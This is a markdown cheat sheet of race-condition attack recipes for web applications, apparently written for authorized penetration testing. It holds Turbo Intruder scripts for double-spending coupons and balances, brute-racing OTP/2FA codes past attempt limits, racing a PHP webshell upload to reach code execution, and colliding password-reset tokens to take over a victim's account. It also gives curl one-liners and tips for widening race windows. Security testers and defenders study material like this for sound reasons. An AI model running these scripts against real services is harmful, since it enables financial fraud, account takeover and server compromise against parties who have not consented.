# Race Condition Arsenal — Turbo Intruder Scripts, Single-Packet Recipes & Detection Patterns

> Companion to `RACE_CONDITION_TESTING_GUIDE.md`. **Pick by the technique the target allows** (HTTP/2 → single-packet; HTTP/1.1 → last-byte-sync) and **always measure the invariant** (balance/count/flag), not the HTTP status. Replace `target.com`, tokens, ids. **Authorized targets only; race your OWN balances/accounts; bounded bursts; never cash out real funds** (guide §21).
>
> **Workflow:** find a limited action + its invariant (§3) → control 1× (§4) → fire N parallel into one window (§5–§7) → re-read invariant → repeat to confirm (§15).

---

## A. Is the target raceable? (set once)
```bash
# HTTP/2 (best — single-packet attack):
curl -sI --http2 https://target.com/ | head -1        # "HTTP/2 200" → single-packet viable
# Capture a clean request of the LIMITED action (Burp → copy) → you'll duplicate it into a group.
```

## B. Burp "Send group in parallel" (the easy button) — §6.1
```
1. Repeater → capture the limited action (e.g. POST /coupon/apply).
2. Tab → "Add to group" (create group) → duplicate the tab 20–30×.
   - pure overrun: keep all identical.
   - brute-race (OTP): vary only the code per tab (0000..9999 subset) or use Turbo (§D).
3. Group menu → "Send group in parallel".
   Burp auto-selects single-packet (HTTP/2) or last-byte-sync (HTTP/1.1).
4. Re-read the INVARIANT (balance/coupon used count) → compare to the 1× control.
```

## C. Turbo Intruder — single-packet overrun (race-single-packet style) — §6.2
```python
# Save as race_overrun.py, attach to the captured request, run.
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,        # one conn, many H2 streams
                           engine=Engine.BURP2)            # HTTP/2 single-packet
    for i in range(30):
        engine.queue(target.req, gate='race1')             # withhold final frames
    engine.openGate('race1')                                # release together (one packet)

def handleResponse(req, interesting):
    table.add(req)
# After it runs: re-read the balance/coupon/credit state to confirm the overrun (status alone lies).
```

## D. Turbo Intruder — OTP / 2FA brute-RACE (rate-limit bypass) — §10
```python
# Vary the OTP guess across parallel requests so they all pass "attempts<5" before the counter ticks.
# Mark the code in the request as %s  (e.g.  {"otp":"%s"} )
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for guess in range(0, 1000):                            # 000..999 (or your range)
        engine.queue(target.req, str(guess).zfill(3), gate='g')
    engine.openGate('g')
def handleResponse(req, interesting):
    if 'invalid' not in req.response.lower():               # tune to the success/failure signal
        table.add(req)
# Win = far MORE attempts accepted than the cap, and/or a success beyond the limit → ATO chain.
```

## E. Turbo Intruder — multi-endpoint race (two templates) — §13
```python
# Collide two different operations on the same state (e.g. "use credit" + "checkout").
# Provide req A and req B; gate both, release together.
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    reqA = '''POST /credit/use HTTP/2\r\nHost: target.com\r\n...\r\n\r\n{"id":1}'''
    reqB = '''POST /checkout HTTP/2\r\nHost: target.com\r\n...\r\n\r\n{"id":1}'''
    for i in range(10):
        engine.queue(reqA, gate='m'); engine.queue(reqB, gate='m')
    engine.openGate('m')
def handleResponse(req, interesting):
    table.add(req)
```

## F. HTTP/1.1 last-byte-sync (when no HTTP/2) — §7
```
Burp "Send group in parallel" handles it automatically on HTTP/1.1.
Turbo Intruder: raise concurrentConnections (e.g. 30) + gate; jitter remains, so raise N and repeat.
```

## G. Connection warming (reduce timing skew) — §8.1
```
Fire one throwaway request on the connection first (Burp/Turbo do this), so the raced
requests are evenly "warm" and land tighter. Especially needed on HTTP/1.1.
```

## H. Detection patterns — measure the INVARIANT, not the status (§4/§16)
```
financial      : balance/ledger after N× vs 1×  → negative balance / credited N×    → RACE
coupon/credit  : "used" flag true BUT credited multiple times                        → RACE
OTP/2FA/limit  : attempts accepted > cap; a success beyond the limit                 → RACE → ATO
uniqueness     : 2+ accounts with same unique email; bonus claimed N×                → RACE
stock/seat     : items reserved/sold > available; quantity goes negative             → RACE
state machine  : object in an impossible state (used twice / posted after leaving)   → RACE
file-upload    : a GET returns the shell / benign marker before scan/rename/move      → RACE → RCE
predict-token  : simultaneous victim+self token issuance COLLIDE (same value)          → RACE → ATO
oauth code     : one single-use code mints >1 access token                            → RACE
idempotent     : N×200 but invariant UNCHANGED                                       → NOT a race
```

## I. Control-vs-parallel proof (paste into the report) — §15
```
CONTROL (1×):   balance before = 100 ; apply coupon ; balance after = 90 ; coupon used=true
PARALLEL (N=20): apply coupon ×20 in one packet ; balance after = 100 - (20×10) = -100
REPEAT:         reset → re-ran 3× → negative balance each time (success rate ~12/20 streams)
INVARIANT BROKEN: a single-use coupon credited 20×; balance went negative.
```

## J. curl/h2 quick parallel (rough — prefer Burp/Turbo for precision)
```bash
# Rough simultaneity with GNU parallel + http2 (jitter-prone; use only for a quick smell test):
seq 20 | parallel -j20 -N0 "curl -s --http2 https://target.com/coupon/apply \
  -H 'Authorization: Bearer <A>' -H 'Content-Type: application/json' -d '{\"code\":\"SAVE10\"}'"
# Then read state: curl -s .../wallet -H 'Authorization: Bearer <A>' | jq .balance
```

## K. Validity checklist (paste into every race test) — §15
```
[ ] Identified the INVARIANT the action protects (once / balance≥0 / ≤N attempts / unique).
[ ] CONTROL (1×) result + invariant recorded.
[ ] PARALLEL burst (single-packet / parallel group) fired into ONE window.
[ ] Invariant BROKE (state read-out, not just 200s).
[ ] REPEATED ≥2–3× with state reset → reproducible.
[ ] Own funds/accounts only; no real money out; state reverted.
[ ] Impact stated: double-spend $ / OTP-bypass→ATO / business abuse.
```

## L. Turbo Intruder — file-upload TOCTOU → RCE (upload + GET flood) — §12.4
```python
# Race a webshell upload against the scan/rename/move. Own/test path only; benign marker; then STOP.
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    reqUP = ('POST /upload HTTP/2\r\nHost: target.com\r\n'
             'Content-Type: multipart/form-data; boundary=X\r\n\r\n'
             '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n'
             'Content-Type: image/png\r\n\r\n<?php echo "RC-".(7*7); ?>\r\n--X--\r\n')
    reqGET = 'GET /uploads/shell.php HTTP/2\r\nHost: target.com\r\n\r\n'
    engine.queue(reqUP, gate='g')
    for i in range(50):
        engine.queue(reqGET, gate='g')        # flood GETs at the predicted URL
    engine.openGate('g')
def handleResponse(req, interesting):
    if 'RC-49' in req.response:                # benign marker executed → window hit → RCE
        table.add(req)
# WIN = a GET returns "RC-49" before the scanner removes/renames the file. If the name is randomised,
# race the read of the temp/quarantine path instead. Chain to the File Upload kit for filter bypasses.
```

## M. Turbo Intruder — predictable / time-seeded token collision → ATO — §10.5
```python
# Issue the reset token for VICTIM and for YOUR OWN account in the SAME packet. If tokens are
# time/seed-derived they collide → the token mailed to YOU is also the victim's → reset → ATO.
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    victim = 'POST /reset HTTP/2\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"email":"victim@test"}'
    mine   = 'POST /reset HTTP/2\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{"email":"me@your-inbox.test"}'
    engine.queue(victim, gate='t'); engine.queue(mine, gate='t')
    engine.openGate('t')
def handleResponse(req, interesting):
    table.add(req)
# Spot it first: request several tokens — shared prefix / tracks time / increments = predictable (CWE-330+362).
# Then read the token from YOUR inbox and try it on the victim's account.
```

## N. OAuth single-use authorization-code reuse race — §10.6
```
Capture the /token exchange (code → access_token). In Burp: group it, duplicate ×10–20,
"Send group in parallel". WIN = the SAME code mints MULTIPLE access tokens (single-use not enforced)
→ token replay / session reuse / account-linking abuse. Same idea for one-time magic-links / email-verify.
```

## O. Widen the race window (when a burst gives only ONE success) — §8.5
```
- pick the SLOW variant of the action (external API/payment/email/scan/report between check & commit).
- inflate the request (bigger valid body / extra ignored fields) so the server parses longer.
- connection-warm first (throwaway request) so raced requests are uniformly fast.
- HTTP/1.1: last-byte-sync inherently delays parse-completion; raise N and repeat.
- behind a load balancer: target SHARED-state actions (DB/Redis row), not per-node in-memory counters (§8.6).
```

## P. Real-world race patterns & references
```
File-upload TOCTOU             → access webshell before scan/rename/move → RCE (highest impact).
Coupon / gift-card / credit    → apply once-only code N× → N× discount/credit (Starbucks gift-card classic).
Withdraw / transfer / refund   → balance goes negative / money created (Critical financial).
OTP / 2FA / reset rate-limit   → brute the code → account takeover (High/Critical).
Predictable / time-seeded token→ simultaneous victim+self issuance collide → reset → ATO (CWE-330).
OAuth single-use code reuse    → race /token exchange → multiple access tokens.
Signup/referral bonus · vote/like · stock/seat → fraud / ranking / oversell.
Tools: Turbo Intruder (race-single-packet.py / examples.py); requests-racer (py); race-the-web (go).
Refs: PortSwigger "Smashing the state machine" (single-packet, 2023); CWE-362/367/841/662/820/330;
      OWASP WSTG Race Conditions; HackerOne disclosed gift-card / OTP-race / file-upload reports.
```
